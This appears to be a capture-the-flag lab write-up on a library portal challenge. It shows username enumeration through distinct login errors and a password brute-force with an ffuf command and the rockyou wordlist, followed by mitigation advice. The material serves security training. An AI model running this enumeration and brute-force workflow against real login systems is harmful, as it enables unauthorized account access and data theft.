---
title: "Weak Credentials – Member Account Compromise | Pinegrass Library Co-op"
date: 2026-05-28 00:00:00 +0530
categories: [A07 - Authentication Failures, Weak Credentials]
tags: [webversepro, authentication-failures, weak-credentials, username-enumeration, ffuf, brute-force]
author: Shivansh Sharma
image:
  path: /assets/images/posts/pinegrass-library-co-op-weak-credentials.webp
  alt: Weak Credentials – Member Account Compromise | Pinegrass Library Co-op
---

## Lab Link

Lab: [Pinegrass Library Co-op](https://dashboard.webverselabs-pro.com/challenges/roll-call)

---

## Overview

Pinegrass Library Co-op provides an online member portal for staff and library members. According to the scenario, every staff account was initially provisioned with a temporary password intended to be changed during the first login.

Unfortunately, those passwords were never changed.

Additionally, the login form exposes different error messages depending on whether a username exists, creating a username enumeration vulnerability that greatly simplifies account discovery.

By combining username enumeration with weak credentials, an attacker can gain unauthorized access to member accounts and retrieve sensitive information.

---

## Objective

Identify a valid member account, discover its password, and obtain the flag stored within the authenticated area.

---

## Vulnerability Identification

This challenge is primarily a Weak Credentials vulnerability.

### Classification Hierarchy

A07 - Authentication Failures
└── Weak Authentication Controls
└── Weak Credentials
└── Default / Unchanged Passwords

### Secondary Issue

A07:2025 - Authentication Failures
└── Account Enumeration
└── Username Enumeration
└── Distinct Authentication Responses

---

## Reconnaissance

The application exposes a login portal at:

```text
https://0dac7627-4065-roll-call-cb4c1.challenges.webverselabs-pro.com/login
```

The challenge description suggests that staff members were issued temporary passwords that were never updated.

Before attempting password attacks, a valid username must be identified.

---

## Exploitation

### Step 1 - Discover Staff Members

Browsing the application reveals an informational page:

```text
/about
```

Visiting:

```text
https://0dac7627-4065-roll-call-cb4c1.challenges.webverselabs-pro.com/about
```

displays several staff members.

One entry is:

```text
Marie Castan
Head librarian · since 2008
```

This provides a potential target account.

---

### Step 2 - Test Username Enumeration

Using the full name as a username:

```text
Marie Castan
```

produces:

```text
We don't have a member by that name.
```

Testing a likely username format:

```text
mcastan
```

produces:

```text
Password incorrect for member mcastan
```

The difference between the responses confirms that the account exists.

This is a classic username enumeration vulnerability.

---

### Step 3 - Capture the Login Request

Intercept a login attempt and save the request.

```http
POST /login HTTP/2
Host: 0dac7627-4065-roll-call-cb4c1.challenges.webverselabs-pro.com
Content-Type: application/x-www-form-urlencoded

member_id=mcastan&password=PASS
```

Save this as:

```text
request.txt
```

---

### Step 4 - Perform Password Discovery

With a confirmed username, use a password wordlist to identify valid credentials.

```bash
ffuf -request request.txt \
-w /usr/share/wordlists/rockyou.txt:PASS \
-mc all \
-fr "Password incorrect for member mcastan"
```

#### Command Breakdown

* `-request` loads the captured HTTP request.
* `-w` supplies candidate passwords.
* `PASS` replaces the password parameter.
* `-fr` filters failed responses.
* Any remaining response indicates a successful login.

---

### Step 5 - Identify the Valid Password

The scan eventually returns:

```text
password1
```

Valid credentials:

```text
Username: mcastan
Password: password1
```

---

### Step 6 - Access the Member Portal

Authenticate using:

```text
mcastan : password1
```

After successful login, access is granted to the member area.

Within the account dashboard, the challenge flag is revealed.

---

## Proof of Exploitation

### Username Enumeration

Invalid user:

```text
We don't have a member by that name.
```

Valid user:

```text
Password incorrect for member mcastan
```

### Discovered Credentials

```text
mcastan : password1
```

### Flag

```text
WEBVERSE{....}
```

---

## Impact

An attacker can:

* Enumerate valid users.
* Identify active accounts.
* Discover weak passwords.
* Access unauthorized user accounts.
* Retrieve sensitive information.
* Escalate attacks using compromised credentials.

In real-world environments, username enumeration significantly reduces the effort required for credential attacks.

---

## Mitigation

### Use Generic Authentication Responses

Avoid revealing whether a username exists.

Instead of:

```text
User does not exist
```

or

```text
Incorrect password
```

Return:

```text
Invalid username or password
```

### Enforce Password Changes

Require users to change temporary passwords during first login.

### Implement Strong Password Policies

Prevent weak passwords such as:

```text
password1
```

### Deploy MFA

Multi-factor authentication reduces the effectiveness of credential attacks.

### Rate Limiting

Restrict repeated authentication attempts.

### Account Lockout Controls

Temporarily lock accounts after repeated failures.

---

## Real-World Insight

Username enumeration and weak credentials frequently appear together during penetration tests.

Organizations often:

* Reuse default passwords.
* Fail to rotate temporary credentials.
* Expose user existence through verbose login errors.

Attackers routinely combine public employee information, username enumeration, and password spraying to compromise accounts.

The Pinegrass Library Co-op challenge demonstrates how a seemingly minor information leak in authentication responses can dramatically increase the effectiveness of credential-based attacks when weak passwords are present.
